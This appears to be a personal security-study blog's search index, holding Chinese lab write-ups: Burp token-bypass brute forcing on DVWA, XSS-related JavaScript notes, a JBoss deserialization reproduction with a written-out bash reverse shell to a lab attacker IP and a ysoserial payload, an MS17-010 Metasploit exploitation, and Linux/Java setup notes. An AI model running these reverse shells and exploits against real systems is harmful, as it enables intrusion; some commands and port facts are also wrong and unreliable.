<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Burpsuite绕过Token爆破</title>
    <url>/article/4fd639c3.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
<p>环境：</p>
<p>DVWA + Burpsuite Pro</p>
<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
<p>2、进行如下配置</p>
<p>Position模块 </p>
<p><img src="/article/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091039611.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>



<p>Paloads模块 – 1</p>
<p><img src="/article/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091434571.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>

<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
<p>Resource Pool模块</p>
<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
<p><img src="/article/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092057193.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>



<p>Option模块</p>
<p>选择Grep Extract模块</p>
<p><img src="/article/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092543186.png" class="lozad post-image"></p>
<p>点击Add，依次填写</p>
<p><img src="/article/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092442542.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>



<p>Redirections模块</p>
<p><img src="/article/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092804701.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>



<p>最后，回到Payloads模块</p>
<p><img src="/article/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093340999.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>



<p>3、结果</p>
<p><img src="/article/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093746103.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>



<p>按照长度排序（状态码相同，无法参考）</p>
<p><img src="/article/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093937504.png" class="lozad post-image"></p>
<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
<p>至此，token绕过爆破攻击结束。</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Token绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础</title>
    <url>/article/a9ba4134.html</url>
    <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><script>alert(1)</script></td>
<td>script标签中执行</td>
</tr>
<tr>
<td><script src="x.js"></script></td>
<td>调用执行</td>
</tr>
<tr>
<td><a href="javascript:alert(1)"></a></td>
<td>链接触发</td>
</tr>
<tr>
<td><p onclick="alert(1)"></p></td>
<td>事件触发</td>
</tr>
</tbody></table>
<h1 id="js事件"><a href="#js事件" class="headerlink" title="js事件"></a>js事件</h1><table>
<thead>
<tr>
<th>事件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Windows事件</td>
<td>针对windows对象触发的事件，应用到body标签</td>
</tr>
<tr>
<td>onafterprint</td>
<td>打印之后触发的事件</td>
</tr>
<tr>
<td>onbeforeprint</td>
<td>打印之前触发的事件</td>
</tr>
<tr>
<td>onerror</td>
<td>发生错误（文件加载错误等）时触发的事件，常跟不存在的图片，用来执行js触发xss漏洞</td>
</tr>
<tr>
<td>onload</td>
<td>页面加载完成后立即发生</td>
</tr>
<tr>
<td>onresize</td>
<td>窗口大小被改变时触发的事件</td>
</tr>
<tr>
<td>onunload</td>
<td>页面下载或刷新网页时触发事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Form事件</td>
<td>由HTML表单内的动作触发的事件，应用到几乎所有的HTML元素，最常用在Form元素</td>
</tr>
<tr>
<td>onblur</td>
<td>当元素失去焦点（鼠标移出等）时触发的事件</td>
</tr>
<tr>
<td>onchange</td>
<td>输入框的值发生变化或者下拉列表框选项触发的事件</td>
</tr>
<tr>
<td>onfocus</td>
<td>当元素获得焦点时触发的事件</td>
</tr>
<tr>
<td>onformchange</td>
<td>当表单被改变时触发的事件</td>
</tr>
<tr>
<td>oninput</td>
<td>当元素获得用户输入时触发的事件</td>
</tr>
<tr>
<td>onselect</td>
<td>元素中文本被选中后触发的事件</td>
</tr>
<tr>
<td>onsubmit</td>
<td>提交表单时触发的事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Keyboard事件</td>
<td></td>
</tr>
<tr>
<td>onkeydown</td>
<td>用户按下按键时触发的事件</td>
</tr>
<tr>
<td>onkeypress</td>
<td>用户敲击按钮时触发的事件</td>
</tr>
<tr>
<td>onkeyup</td>
<td>用户释放按键时触发的事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Mouse事件</td>
<td>由鼠标或类似用户动作触发的事件</td>
</tr>
<tr>
<td>onclick</td>
<td>元素上发生鼠标点击时触发的事件</td>
</tr>
<tr>
<td>ondblclick</td>
<td>元素上发生鼠标双击时触发的事件</td>
</tr>
<tr>
<td>onmousedown</td>
<td>当元素上按下鼠标按钮时触发的事件</td>
</tr>
<tr>
<td>onmousemove</td>
<td>当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td>onmouseover</td>
<td>当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td>onmouseout</td>
<td>当鼠标指针移出元素时触发的事件</td>
</tr>
<tr>
<td>onmouseup</td>
<td>当在元素上释放鼠标按钮时触发的事件</td>
</tr>
</tbody></table>
<p>更多事件访问文档：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>
<h1 id="DOM操作"><a href="#DOM操作" class="headerlink" title="DOM操作"></a>DOM操作</h1><table>
<thead>
<tr>
<th>使用</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>通过ID获取</td>
<td>document.getElementById()</td>
</tr>
<tr>
<td>通过标签名称获取（结果有多个，以数组形式存放）</td>
<td>docunment.getElementsByTagName()</td>
</tr>
<tr>
<td>通过对象名称获取（结果有多个，以数组形式存放）</td>
<td>documemt.getElementsByClassName()</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>document事件操作</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>动态添加事件</td>
<td>document.getElementById(“x”).addEventListener(“click”,function(){  })             <br>给img添加点击事件  <br>document.getElementById(“x”).addEventListener(“click”,function(){  alert(“这是图片”)  })</td>
</tr>
<tr>
<td>创建标签</td>
<td>document.createElement(“img”)                      #创建img标签  <br>创建img标签，并添加属性 <br> img =  document.createElement(“img”)   img.src =  “x.jpg”  img.style.width  = “100px”  …     <br>可以创建script标签实现跨站脚本攻击<br>  <img src="/article/.%5CJavaScript%E5%9F%BA%E7%A1%80.assets%5C1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/.%5CJavaScript%E5%9F%BA%E7%A1%80.assets%5C1.png" class="lozad post-image"></td>
</tr>
<tr>
<td>应用</td>
<td>document.body.appendChild()  执行添加/创建（否则不显示）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程基础</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss反序列化漏洞复现</title>
    <url>/article/b552cccc.html</url>
    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
<p>攻击机：192.168.66.138</p>
<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>

<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>

<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>

<p>注：poc版本&gt;=5</p>
<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>JBoss反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java环境变量配置及切换</title>
    <url>/article/13b563a9.html</url>
    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>

<p>3、新建 CLASSPATH</p>
<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>

<p>4、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>

<p>5、重启</p>
<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>



<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>

<p>3、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>



<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
<p>2、新建java8.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>

<p>3、新建java11.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>

<p>注：管理员权限运行</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux随记</title>
    <url>/article/76623e95.html</url>
    <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br></pre>

<pre class="highlight"><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>

<h2 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h2><pre class="highlight"><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 8.8.8.8</span><br></pre>

<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>arp -a 192.168.x.x  查看ip是否被使用，用来选择静态ip</p>
<p>常用DNS：</p>
<p>国内：114.114.114.114、223.5.5.5、119.29.29.29等</p>
<p>国外：1.1.1.1、8.8.8.8等</p>
<h1 id="重要目录及文件"><a href="#重要目录及文件" class="headerlink" title="重要目录及文件"></a>重要目录及文件</h1><table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>/etc</td>
<td>存放所有管理系统所需要的配置文件和子目录</td>
</tr>
<tr>
<td></td>
<td>/etc/passwd                                  #存放操作系统用户信息<br>/etc/shadow                                 #存放操作系统账户密码<br>/etc/group                                    #存储当前系统中所有用户组信息<br>/etc/gshadow                               #存储用户组密码的一类信息<br>/etc/nginx/nginx.conf                 # Nginx配置文件<br>/etc/httpd/conf/httpd.conf        # Apache配置文件路径</td>
</tr>
<tr>
<td>/usr</td>
<td>Linux系统资源目录，类似Windows下的program files目录</td>
</tr>
<tr>
<td></td>
<td>/usr/local/nginx/html        # Nginx默认网站路径</td>
</tr>
<tr>
<td>/var</td>
<td>系统运行时需要改变的数据&lt;br /</td>
</tr>
<tr>
<td></td>
<td>/var/log                  #日志存放目录<br>/var/spool/cron    #计划任务目录，定时执行<br>/var/lib/mysql       # mysql数据路径<br>/var/www/html     # Apache默认网站路径</td>
</tr>
</tbody></table>
<h1 id="常用解压压缩"><a href="#常用解压压缩" class="headerlink" title="常用解压压缩"></a>常用解压压缩</h1><pre class="highlight"><span class="line">tar -zxvf file  -C ./dir			  	#解压.tar.gz文件到指定文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf ./file  file1 file2			#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面</span><br><span class="line"></span><br><span class="line">unzip file								#解压zip文件</span><br><span class="line"></span><br><span class="line">zip file								#压缩zip文件</span><br><span class="line"></span><br></pre>

<pre class="highlight"><span class="line">7za x file.7z -r -o./					#解压</span><br><span class="line">7za a -t7z file.7z /opt/fileName/*		#压缩</span><br></pre>

<p>注：压缩中，-t指定压缩类型，可忽略（默认7z）</p>
<p>下载使用</p>
<pre class="highlight"><span class="line">yum install p7zip -y</span><br></pre>



<h1 id="VI使用"><a href="#VI使用" class="headerlink" title="VI使用"></a>VI使用</h1><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>i、I</td>
<td>i光标处输入，I所在行第一个非空格符处输入</td>
</tr>
<tr>
<td>a、A</td>
<td>a光标下一个字符处输入，A行末处输入</td>
</tr>
<tr>
<td>o、O</td>
<td>o光标下一新行输入，O光标上一新行输入</td>
</tr>
<tr>
<td>ESC</td>
<td>命令模式</td>
</tr>
<tr>
<td>ctrl+b</td>
<td>上翻</td>
</tr>
<tr>
<td>ctrl+f</td>
<td>下翻</td>
</tr>
<tr>
<td>0</td>
<td>移动到行首</td>
</tr>
<tr>
<td>$</td>
<td>移动到行尾</td>
</tr>
<tr>
<td>gg</td>
<td>移动到文档首</td>
</tr>
<tr>
<td>G</td>
<td>移动到文档尾</td>
</tr>
<tr>
<td>:%s/word1/word2/g</td>
<td>全局替换word1为word2</td>
</tr>
<tr>
<td>/word</td>
<td>向光标之下寻找word字符串</td>
</tr>
<tr>
<td>?word</td>
<td>向光标之上寻找word字符串</td>
</tr>
<tr>
<td>x、X</td>
<td>剪切</td>
</tr>
<tr>
<td>dd</td>
<td>删除整行</td>
</tr>
<tr>
<td>ndd</td>
<td>删除n行</td>
</tr>
<tr>
<td>yy</td>
<td>复制整行</td>
</tr>
<tr>
<td>nyy</td>
<td>复制n行</td>
</tr>
<tr>
<td>p、P</td>
<td>p向下粘贴，P向上粘贴</td>
</tr>
<tr>
<td>u</td>
<td>撤销，直至还原</td>
</tr>
<tr>
<td>ctrl+r</td>
<td>撤销，仅限一步</td>
</tr>
<tr>
<td>.</td>
<td>重复上一个动作</td>
</tr>
<tr>
<td>:q</td>
<td>不保存退出</td>
</tr>
<tr>
<td>:w</td>
<td>保存退出</td>
</tr>
<tr>
<td>:!</td>
<td>强制执行</td>
</tr>
<tr>
<td>:! command</td>
<td>暂时离开vi执行command</td>
</tr>
<tr>
<td>:set nu</td>
<td>显示行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消显示行号</td>
</tr>
</tbody></table>
<h1 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h1><pre class="highlight"><span class="line">find / -name &quot;file&quot;  在根目录下查看文件名为file的文件</span><br><span class="line">find / -perm &quot;root&quot;  在根目录下查找root权限文件</span><br><span class="line">find / -user &quot;root&quot;  在根目录下查找root用户文件</span><br></pre>



<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="curl安装"><a href="#curl安装" class="headerlink" title="curl安装"></a>curl安装</h2><p>（需要有下载路径，本机对服务器的下载）</p>
<p>curl _ip/_file -o filename  -o可替换为&gt;</p>
<h2 id="scp上传"><a href="#scp上传" class="headerlink" title="scp上传"></a>scp上传</h2><p>（需要有源文件，本机对服务器的上传）</p>
<p>scp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传</p>
<p>scp filename root@ip:/_path</p>
<h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>（需要源网站里面有对应的软件）</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yum search</td>
<td>查找</td>
</tr>
<tr>
<td>yum install</td>
<td>安装</td>
</tr>
<tr>
<td>yum remove</td>
<td>移除</td>
</tr>
<tr>
<td>yum update</td>
<td>升级，可指定升级，也可全部升级</td>
</tr>
</tbody></table>
<p>注：yum源文件：/etc/yum.repos.d</p>
<h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>（同curl，但是更简单，速度更快）</p>
<p>wget _path/_file</p>
<h2 id="源码安装步骤"><a href="#源码安装步骤" class="headerlink" title="源码安装步骤"></a>源码安装步骤</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1、tar 解包</td>
<td>解压缩源码包到指定目录</td>
</tr>
<tr>
<td>2、./configure</td>
<td>配置生成makefile文件，可手动配置参数（如安装路径）</td>
</tr>
<tr>
<td>3、make编译</td>
<td>生成可执行的二进制文件</td>
</tr>
<tr>
<td>4、make install安装</td>
<td>复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）</td>
</tr>
</tbody></table>
<p>注：configure配置文档（官方文档）</p>
<p><a href="http://nginx.org/en/docs/configure/html">http://nginx.org/en/docs/configure/html</a>  </p>
<h1 id="firewall防火墙配置"><a href="#firewall防火墙配置" class="headerlink" title="firewall防火墙配置"></a>firewall防火墙配置</h1><table>
<thead>
<tr>
<th align="left">命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">firewall-cmd  –state</td>
<td>查看防火墙状态</td>
</tr>
<tr>
<td align="left">firewall-cmd  –get-active-zones</td>
<td>查看正在使用的区域及网卡名称</td>
</tr>
<tr>
<td align="left">firewall-cmd  –list-all-zones</td>
<td>显示当前预期网卡配置参数、资源、端口及服务等信息</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –add-port=80/tcp –permanent</td>
<td>允许80端口tcp流量通过，永久生效</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –add-service=http –permanent</td>
<td>同上，不同的配置方式</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –remove-port=23/udp –permanent</td>
<td>禁止23端口udp流量通过，永久生效</td>
</tr>
<tr>
<td align="left">firewall-zone  –zone=public –remove-service=dns –permanent</td>
<td>同上，不同配置方式</td>
</tr>
</tbody></table>
<p>常用端口服务：</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>http</td>
<td>80/tcp</td>
</tr>
<tr>
<td>https</td>
<td>443/tcp</td>
</tr>
<tr>
<td>dns</td>
<td>23/udp</td>
</tr>
<tr>
<td>mysql</td>
<td>3306/tcp</td>
</tr>
<tr>
<td>ssh</td>
<td>22/tcp</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010漏洞复现</title>
    <url>/article/484411d0.html</url>
    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>


<p>结果：</p>
<p> <img src="/article/1.jpg" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.jpg" class="lozad post-image"></p>
<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
<pre class="highlight"><span class="line">search MS17-010</span><br></pre>

<p>发现2个探测模块和4个利用模块</p>
<p> <img src="/article/2.jpg" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.jpg" class="lozad post-image"></p>
<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>

<p>探测出存在MS17-010漏洞</p>
<p> <img src="/article/3.jpg" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/3.jpg" class="lozad post-image"></p>
<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>


<p>攻击成功，进入后渗透攻击阶段</p>
<p><img src="/article/4.jpg" alt="4" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/4.jpg" class="lozad post-image"></p>
<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
<pre class="highlight"><span class="line">sysinfo</span><br></pre>

<p> <img src="/article/5.jpg" alt="5" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/5.jpg" class="lozad post-image"></p>
<p>b、查看当前获取的权限</p>
<pre class="highlight"><span class="line">getuid</span><br></pre>

<p> <img src="/article/6.jpg" alt="6" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/6.jpg" class="lozad post-image"></p>
<p>system权限，无需提权</p>
<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>

